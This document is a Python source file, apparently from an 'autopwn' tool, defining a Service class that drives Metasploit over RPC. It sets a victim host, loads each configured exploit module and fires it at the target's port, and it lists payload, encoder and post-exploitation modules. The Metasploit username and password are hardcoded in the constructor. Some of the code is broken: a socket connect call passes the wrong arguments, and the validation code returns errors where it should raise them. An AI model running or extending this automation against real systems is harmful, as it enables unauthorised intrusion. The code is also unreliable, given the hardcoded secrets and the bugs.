

import socket
from pymetasploit3.msfrpc import MsfRpcClient
from pprint import pprint
from autopwn.util import acid
from ..util.msf import (
    splitmodule,
    verifyJob
)

import logging
log = logging.getLogger('autopwn')


class Service(object):
    def __init__(self):
        self._msfuser = "talosvillage"
        self._msfpass = "T4L05PWN5U"
        self._msfrpcd = MsfRpcClient(
            self._msfpass,
            username=self._msfuser,
            ssl=True,
            server="127.0.0.1",
            port=55553,
        )

    def msfcore(self):
        """ Return Modules in MsfRpcClient """
        return [m for m in dir(self._msfrpcd) if not m.startswith("_")]

    def exploit(self, module):
        log.debug("Preparing exploit for {}".format(self.name))
        mType, mPath = splitmodule(module)
        pwn = self._msfrpcd.modules.use(mType, mPath)
        # MSF options
        # if "RHOST" in pwn.options:
        #     pwn['RHOST'] = host
        # elif "RHOSTS" in pwn.options:
        #     pwn['RHOSTS'] = host
        pwn['RPORT'] = self.ports[0] # Change self.port from a list to single entry
#        pprint(pwn.options)
#        pprint(pwn.targetpayloads())
        log.info("{} fired!".format(pwn.name))
        return pwn.execute()

    def exploitall(self, host):
        log.debug(f"Performing {self.name} acid test")
        acid.check_port(host, self.ports)
        log.debug("Sending all exploits for {}".format(self.name))
        self.victim = host
        for i in self.exploits:
            result = self.exploit(i)
            if not verifyJob(result):
                log.info("Exploit failed...")
                pass

    def acid_test(self, host):
        raise NotImplementedError("Can't run acid_test on base class")

    def login(self):
        return

    def status(self, ip):
        """ Some sort of base for checking service status """
        if "TCP" in self.protocols:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            for p in self.ports:
                try:
                    s.connect((ip), p)
                    return True
                except socket.error:
                    raise Exception(
                        "{ip}: {name} is down on port {port}".format(
                            ip=ip, name=self.name, port=p
                        )
                    )

    def shells(self):
        """ List sessions """
        return

    def attach(self):
        """ Attach to a session"""
        return

    def detach(self):
        """ Kill a session """
        return

    """ Helpers """

    def search(self, keyword=None):
        if keyword:
            if not isinstance(keyword, str):
                return TypeError("Search keyword must be a string.")
            return [s for s in self._msfrpcd.modules.exploits if keyword.lower() in s]
        return self._msfrpcd.modules.exploits


    """ Properties """

    @property
    def victim(self):
        return self._victim

    @victim.setter
    def victim(self, host):
        if not isinstance(host, str):
            return TypeError("Host must be an IPv4 string.")
        self._victim = host
        self._msfrpcd.core.setg("RHOSTS", host)
        self._msfrpcd.core.setg("RHOST", host)

    @property
    def auxiliary(self):
        return self._msfrpcd.modules.auxiliary

    @property
    def encoders(self):
        return self._msfrpcd.modules.encoders

    @property
    def nops(self):
        return self._msfrpcd.modules.nops

    @property
    def payloads(self):
        return self._msfrpcd.modules.payloads

    @property
    def post(self):
        return self._msfrpcd.modules.post

